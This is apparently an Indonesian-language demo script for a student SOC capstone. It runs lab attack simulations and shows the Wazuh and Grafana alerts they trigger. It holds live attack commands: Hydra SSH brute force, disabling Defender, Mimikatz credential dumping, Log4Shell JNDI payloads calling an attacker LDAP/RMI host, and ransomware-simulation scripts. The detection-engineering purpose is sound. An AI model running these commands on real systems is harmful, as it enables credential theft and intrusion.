# Panduan Demo — Project Sentinel
**SIEMsalabim capstone kelar · FYEP Cybersecurity 2026**

---

## Persiapan (H-10 menit)

### 1. Buka semua tab browser
```
Tab 1 : https://100.84.121.118          → Wazuh Security Events
Tab 2 : http://100.84.121.118:3000      → Grafana SOC Dashboard
Tab 3 : Telegram grup Project Sentinel FYEP15
```

### 2. Set Wazuh Dashboard
```
Security Events → time range: Today → Refresh
```

### 3. Siapkan terminal Kali
```bash
cd ~/Documents/fyep
ping -c 1 192.168.10.30   # Linux Endpoint — harus reply
ping -c 1 192.168.10.20   # Windows Endpoint — harus reply
ping -c 1 100.69.237.58   # Honeypot via Tailscale — harus reply
```

### 4. Siapkan terminal Wazuh Manager (buka di tab terpisah)
```bash
ssh wazuh-admin@100.84.121.118
sudo tail -f /var/ossec/logs/alerts/alerts.json | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        rule_id = d.get('rule',{}).get('id','')
        level = d.get('rule',{}).get('level',0)
        agent = d.get('agent',{}).get('name','')
        desc = d.get('rule',{}).get('description','')
        if level >= 5:
            print(f'[{agent}] rule={rule_id} level={level} | {desc[:60]}')
    except:
        pass
"
```

---

## Demo 1 — Network Reconnaissance

**Terminal: Kali Linux**

```bash
bash attack_simulation.sh --mode recon
# Ketik: y
```

**Output yang diharapkan:**
```
Nmap scan report for 192.168.10.2   → pfSense
Nmap scan report for 192.168.10.20  → Windows Endpoint
Nmap scan report for 192.168.10.30  → Linux Endpoint
```

**Tunjukkan ke juri:**
- Hasil Nmap menampilkan host dan port aktif di VLAN10
- Dari sisi defender, jalankan asset discovery:

```bash
# Di Wazuh Manager (tab terpisah)
sudo bash /opt/asset-discovery/nmap-scan.sh
```

```
Wazuh Dashboard → Security Events → rule.id: 100603
→ "ASSET DISCOVERY - Daily scan complete"
```

**Narasi:**
> "Penyerang memetakan jaringan. Dari sisi defender, sistem asset discovery otomatis berjalan setiap hari dan akan alert jika ada host baru yang tidak dikenal."

---

## Demo 2 — Brute Force SSH

**Terminal: Kali Linux**

```bash
# Jalankan di background agar tidak perlu menunggu selesai
hydra -L /tmp/sentinel_userlist.txt \
      -P /tmp/sentinel_wordlist.txt \
      -t 16 -vV \
      ssh://192.168.10.30 &
```

**Tunggu 30 detik, lalu tunjukkan:**
```
Wazuh Dashboard → Security Events
→ filter: agent.name: fyep-1
→ rule 5710  : "sshd: authentication failed" (banyak event)
→ rule 100012: "SSH Brute Force detected" level 11
```

**Output terminal Wazuh yang diharapkan:**
```
[fyep-1] rule=5710  level=5  | sshd: authentication failed
[fyep-1] rule=5710  level=5  | sshd: authentication failed
[fyep-1] rule=100012 level=11 | SSH Brute Force detected from 192.168.10.1
```

**Narasi:**
> "Hydra mencoba ratusan kombinasi password. Wazuh mendeteksi threshold 10 kali gagal dalam 120 detik — alert T1110 Brute Force fired."

---

## Demo 3 — Brute Force RDP

**Windows Endpoint — PowerShell Admin**

```powershell
powershell -ExecutionPolicy Bypass -File C:\Users\fyep-2\Desktop\rdp_bruteforce_sim.ps1
```

**Output yang diharapkan:**
```
[1/15] Attempt: administrator / wrongpass1 → Failed
[2/15] Attempt: admin / wrongpass2 → Failed
...
[15/15] Attempt: sysadmin / test123 → Failed
Selesai: 15 authentication attempts
```

**Tunjukkan ke juri:**
```
Wazuh Dashboard → Security Events → agent.name: windows-endpoint
→ rule 100003: "Windows: Failed Authentication Attempt"
→ rule 100004: "Multiple Failed RDP/SMB Logins" level 11
```

**Narasi:**
> "Brute force RDP terdeteksi via Windows Event ID 4625. Setelah 10 kali gagal dalam 120 detik, alert T1021 fired."

---

## Demo 4 — Honeypot Trigger

**Terminal: Kali Linux**

```bash
bash attack_simulation.sh --mode honeypot
# Ketik: y
```

**Output yang diharapkan:**
```
[INFO] Mencoba: root / admin
root@gtcorp-prod-db01:~#   ← Cowrie menerima — hostname palsu
[INFO] Mencoba: admin / password
[OK] Honeypot trigger selesai
```

**Tunjukkan ke juri (< 15 detik):**
```
Wazuh Dashboard → Security Events → rule.groups: honeypot
→ rule 100100: "New SSH connection to honeypot" level 12
→ rule 100101: "Attacker logged into honeypot (root/admin)" level 14
→ rule 100103: "Command executed: whoami" level 12

Telegram → notifikasi dengan username + password + command yang diketik
```

**Tunjukkan IP penyerang:**
```
Klik alert honeypot → expand fields
→ data.src_ip: 100.82.107.52 (IP Kali asli)
```

**Narasi:**
> "Penyerang tidak tahu dia masuk ke honeypot. Hostname 'gtcorp-prod-db01' sengaja meyakinkan. Setiap command yang diketik langsung dikirim ke Wazuh dan Telegram dalam < 15 detik."

---

## Demo 5 — Canary Token Linux

**Terminal: Kali Linux**

```bash
bash attack_simulation.sh --mode canary
# Ketik: y
# Masukkan password fyep-1 saat diminta
```

**Output yang diharapkan:**
```
[INFO] Mengakses canary token Linux...
# Database Configuration — Global-Tech Corp
# CONFIDENTIAL — Internal Use Only
[production_db]
host=192.168.10.30
password=Pr0d@GTCorp2026!
[OK] Canary token Linux triggered
```

**Tunjukkan ke juri (< 30 detik):**
```
Wazuh Dashboard → Security Events
→ rule 100301: "CANARY TOKEN TRIGGERED - Possible Data Exfiltration"
→ level 15 CRITICAL

Telegram → notifikasi CANARY TOKEN TRIGGERED
```

**Narasi:**
> "Penyerang menggunakan credential yang sudah dicuri untuk mengakses file yang terlihat seperti konfigurasi database asli. Saat file dibuka, sinyal langsung dikirim ke Wazuh — mendeteksi reconnaissance dan exfiltration bahkan dari dalam sistem."

---

## Demo 6 — Canary Token Windows

**Windows Endpoint**

```powershell
notepad "C:\Users\fyep-2\Documents\credentials.xlsx"
```

**Tunggu 30 detik, tunjukkan:**
```
Telegram → notifikasi:
  File    : credentials.xlsx
  Username: fyep-2
  Process : notepad.exe
  Waktu   : [timestamp]

Wazuh Dashboard → Discover
→ search: rule.groups: canary_token
→ tunjukkan alert dari agent 000
```

**Narasi:**
> "Canary token Windows — file spreadsheet berisi credential palsu yang terlihat nyata. Saat penyerang membukanya, canary-monitor.py langsung mendeteksi via Wazuh archives dan mengirim notifikasi Telegram."

---

## Demo 7 — Mimikatz Credential Dump

**Windows Endpoint — PowerShell Admin**

```powershell
# Step 1: Nonaktifkan Defender sementara
Set-MpPreference -DisableRealtimeMonitoring $true

# Step 2: Jalankan Mimikatz
cd "C:\Users\fyep-2\Desktop\tools\mimikatz\x64"
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Output Mimikatz yang diharapkan:**
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
User Name : fyep-2
Domain    : DESKTOP-SR3VUHC
NTLM      : [HASH]
```

**Tunjukkan ke juri (< 2 menit):**
```
Wazuh Dashboard → Security Events → agent.name: windows-endpoint
→ rule 92900: "Lsass process was accessed by ...\mimikatz.exe"
→ level 12
```

**Step 3: Aktifkan kembali Defender**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

**Narasi:**
> "Teknik yang digunakan MGM Resorts 2023. Mimikatz mengakses memori lsass.exe untuk mengambil hash NTLM semua user. Sysmon Event ID 10 mendeteksi akses ini dan Wazuh rule 92900 fired — T1003 OS Credential Dumping."

---

## Demo 8 — Micro-segmentation (Lateral Movement)

**Terminal: fyep-1 (SSH ke Linux Endpoint)**

```bash
ssh fyep-1@192.168.10.30
```

**Jalankan test live:**
```bash
echo "=== Lateral movement attempt ke VLAN Management ==="
nc -zvw 3 192.168.20.10 445  && echo "BERHASIL" || echo "DIBLOKIR pfSense"
nc -zvw 3 192.168.20.10 3389 && echo "BERHASIL" || echo "DIBLOKIR pfSense"
nc -zvw 3 192.168.20.10 22   && echo "BERHASIL" || echo "DIBLOKIR pfSense"
nc -zvw 3 192.168.20.10 80   && echo "BERHASIL" || echo "DIBLOKIR pfSense"

echo ""
echo "=== Port yang diizinkan (whitelist) ==="
nc -zvw 3 192.168.20.10 1514 && echo "BERHASIL - Wazuh agent OK" || echo "GAGAL"
nc -zvw 3 192.168.20.10 3000 && echo "BERHASIL - Grafana OK"     || echo "GAGAL"
```

**Output yang diharapkan:**
```
=== Lateral movement attempt ke VLAN Management ===
DIBLOKIR pfSense   ← port 445  (SMB)
DIBLOKIR pfSense   ← port 3389 (RDP)
DIBLOKIR pfSense   ← port 22   (SSH)
DIBLOKIR pfSense   ← port 80   (HTTP)

=== Port yang diizinkan (whitelist) ===
BERHASIL - Wazuh agent OK   ← port 1514
BERHASIL - Grafana OK       ← port 3000
```

**Tunjukkan rule pfSense:**
```
pfSense → Firewall → Rules → VLAN10_PROD
→ "Allow Production to Wazuh" port 1514 ✅
→ "Allow Grafana access" port 3000 ✅
→ "Block Production to Management" ❌
```

**Narasi:**
> "Zero Trust Network — dari VLAN Production, penyerang tidak bisa reach VLAN Management. SMB, RDP, SSH, HTTP semua diblokir. Hanya Wazuh agent dan Grafana yang diizinkan. Ini mencegah lateral movement seperti kasus Colonial Pipeline 2021."

---

## Demo 9 — Ransomware FIM

**Windows Endpoint — PowerShell**

```powershell
powershell -ExecutionPolicy Bypass -File C:\Users\fyep-2\Desktop\ransomware_sim.ps1
# Ketik: y
```

**Output yang diharapkan:**
```
[1/3] Membuat 60 file target... → 60 file dibuat
[2/3] Menunggu 15 detik agar Wazuh FIM scan...
[3/3] Simulasi enkripsi massal dimulai...
    Progress: 10/60 file dienkripsi
    Progress: 20/60 file dienkripsi
    ...
    Progress: 60/60 file dienkripsi
Enkripsi selesai: 60 file dalam X detik
```

**Tunjukkan ke juri (< 5 menit):**
```
Wazuh Dashboard → Security Events → agent.name: windows-endpoint
→ rule 100700: "RANSOMWARE DETECTED - .locked extension" level 12
→ rule 100701: "RANSOMWARE CRITICAL - Mass file encryption" level 15
```

**Restore setelah demo:**
```powershell
powershell -ExecutionPolicy Bypass -File C:\Users\fyep-2\Desktop\ransomware_sim.ps1 -Mode restore
```

**Narasi:**
> "Terinspirasi kasus Caesars Entertainment 2023. 60 file dienkripsi sekaligus dengan ekstensi .locked. Wazuh FIM realtime mendeteksi perubahan massal dan memicu alert CRITICAL T1486 — Data Encrypted for Impact."

---

## Demo 10 — Log4Shell CVE-2021-44228

**Terminal: Kali Linux**

```bash
TARGET="192.168.10.30"
ATTACKER="100.82.107.52"

# Payload 1: Header X-Api-Version
curl -v -H "X-Api-Version: \${jndi:ldap://$ATTACKER/exploit}" \
  http://$TARGET/ 2>&1 | grep -E "X-Api|200|Connected"

# Payload 2: User-Agent
curl -v -A "\${jndi:ldap://$ATTACKER/a}" \
  http://$TARGET/ 2>&1 | grep -E "User-Agent|200"

# Payload 3: RMI
curl -v -H "X-Api-Version: \${jndi:rmi://$ATTACKER:1099/exploit}" \
  http://$TARGET/ 2>&1 | grep -E "X-Api|200"
```

**Verifikasi payload masuk ke Nginx log:**
```bash
# SSH ke fyep-1
ssh fyep-1@192.168.10.30
sudo tail -5 /var/log/nginx/access.log | grep jndi
```

**Output yang diharapkan:**
```
192.168.10.1 - - [01/Jun/2026] "GET / HTTP/1.1" 200 - "${jndi:ldap://100.82.107.52/exploit}"
```

**Tunjukkan ke juri (< 30 detik):**
```
Wazuh Dashboard → Security Events
→ rule 100800: "Log4Shell Exploitation Attempt - CVE-2021-44228" level 13
→ rule 100802: "Multiple JNDI injection attempts" level 15
→ agent: fyep-1
```

**Narasi:**
> "CVE-2021-44228 — salah satu vulnerability paling berbahaya 2021. Hanya dengan mengirim string \${jndi:} di HTTP header, server yang menggunakan Log4j bisa dieksploitasi. Custom rule 100800 mendeteksi pattern ini di Nginx log dalam < 30 detik."

---

## Demo 11 — Grafana SOC Dashboard (Penutup)

**Browser: http://100.84.121.118:3000**

Tunjukkan satu per satu:

```
Panel 1 — Total Alert Aktif
→ angka total dari seluruh demo hari ini

Panel 2 — Alert per Severity
→ distribusi level — tunjukkan CRITICAL paling dominan

Panel 3 — Top 10 Source IP
→ 192.168.10.1 (pfSense NAT dari Kali)
→ jelaskan: "ini IP gateway pfSense — serangan dari luar masuk via NAT"
→ klik alert honeypot di Wazuh untuk tunjukkan IP asli: 100.82.107.52

Panel 4 — Alert Timeline
→ tunjukkan spike di setiap demo yang dijalankan
→ "setiap lonjakan adalah satu skenario serangan"

Panel 5 — Top Rules Terpicu
→ pie chart: honeypot, canary, brute force, ransomware, log4shell

Panel 6 — Honeypot Alerts 24 jam
→ 49+ alerts
```

**Tunjukkan auto-refresh:**
```
Pojok kanan atas → "30s" — auto-refresh aktif
```

**Narasi:**
> "Single pane of glass untuk SOC — dalam satu layar, semua informasi kritis tersedia tanpa berpindah halaman. Dashboard auto-refresh setiap 30 detik. Dari sini analis bisa langsung identifikasi IP penyerang paling aktif, rule yang paling sering triggered, dan pola waktu serangan."

---

## Pasca Demo — Cleanup

```powershell
# Windows Endpoint
Set-MpPreference -DisableRealtimeMonitoring $false
powershell -ExecutionPolicy Bypass -File C:\Users\fyep-2\Desktop\ransomware_sim.ps1 -Mode restore
```

```bash
# Kali Linux — hapus Hydra dari background jika masih jalan
kill %1 2>/dev/null

# pfSense — hapus IP Kali dari blocklist jika diblokir
# pfSense console → 8) Shell
# pfctl -t sshlockout -T delete 100.82.107.52
```

```bash
# fyep-1 — restore jam jika diubah
sudo timedatectl set-ntp true
```

---

## Ringkasan Rule ID per Demo

| Demo | Rule ID | Level | Deskripsi |
|---|---|---|---|
| Brute Force SSH | 5710, 100012 | 5, 11 | SSH auth failed + threshold |
| Brute Force RDP | 100003, 100004 | 5, 11 | Windows auth failed + threshold |
| Honeypot | 100100-104 | 12-15 | SSH connect, login, command |
| Canary Token Linux | 100301 | 15 | Data exfiltration CRITICAL |
| Canary Token Windows | 100301 | 15 | credentials.xlsx accessed |
| Mimikatz | 92900 | 12 | lsass.exe accessed by mimikatz |
| Ransomware FIM | 100700, 100701 | 12, 15 | .locked extension + mass encryption |
| Log4Shell | 100800, 100802 | 13, 15 | JNDI payload + multiple attempts |

---

*Project Sentinel · SIEMsalabim capstone kelar · FYEP Cybersecurity 2026*
